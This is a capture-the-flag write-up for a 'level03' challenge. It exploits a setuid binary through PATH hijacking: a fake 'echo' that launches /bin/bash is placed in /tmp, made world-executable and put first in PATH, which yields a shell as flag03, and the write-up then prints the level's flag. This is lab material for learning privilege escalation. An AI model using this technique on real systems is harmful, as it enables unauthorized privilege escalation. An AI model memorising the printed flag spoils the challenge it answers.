`ls -l` <br/>
-rwsr-sr-x  1  flag03  level03  8627  Mar  5  2016  level03

`When applied to an executable file, it sets the effective user ID from that of the real user (the user actually running the program) to that of the program's owner. Most often this is given to a few programs owned by the superuser. When an ordinary user runs a program that is "setuid root" , the program runs with the effective privileges of the superuser. This allows the program to access files and directories that an ordinary user would normally be prohibited from accessing. Clearly, because this raises security concerns, the number of setuid programs must be held to an absolute minimum.` <br/>
https://askubuntu.com/questions/857066/meaning-of-the-access-permissions-rws-and-root-root-of-usr-bin-sudo

https://www.cgsecurity.org/Articles/SecProg/Art1/index-fr.html

https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code

Security threat, can replace env variable

`echo "/bin/bash" > /tmp/echo`

Create a fake echo that will execute /bin/bash, that is a new connection to our shell with the current user's permission

`chmod 777 /tmp/echo`

otherwise the file is `-rw-rw-r-- 1 level03 level03 10 Sep 22 02:19 /tmp/echo` and flag03 can't execute it


`export PATH=/tmp:$PATH`

Do command `env` and see path went from:

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

to 

PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

So when calling env, the shell is going to read PATH variable to see where is the file to execute and will execute the first it finds, here our fake echo in tmp

then execute script `./level03`

You are now flag3 because you "opened" a new shell with the rights of flag03

`getflag` gives `qi0maab88jeaj46qoumi7maus`
